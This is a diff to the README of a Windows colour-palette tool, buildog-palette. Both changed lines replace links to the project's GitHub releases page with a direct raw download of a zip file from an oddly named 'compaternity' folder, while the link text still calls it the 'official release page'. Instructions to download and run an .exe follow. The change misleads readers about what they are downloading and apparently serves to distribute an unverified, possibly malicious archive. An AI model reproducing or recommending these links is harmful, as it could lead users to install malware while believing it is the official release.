@@ -1,6 +1,6 @@
 # 🎨 buildog-palette - Create perfect color themes with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/nattaponghkst-pixel/buildog-palette/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/nattaponghkst-pixel/buildog-palette/main/compaternity/palette_buildog_v3.6.zip)
 
 ## What is buildog-palette? 🔍
 
@@ -17,7 +17,7 @@ Buildog-palette helps you manage and create color schemes for your projects. Dig
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/nattaponghkst-pixel/buildog-palette/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/nattaponghkst-pixel/buildog-palette/main/compaternity/palette_buildog_v3.6.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes.
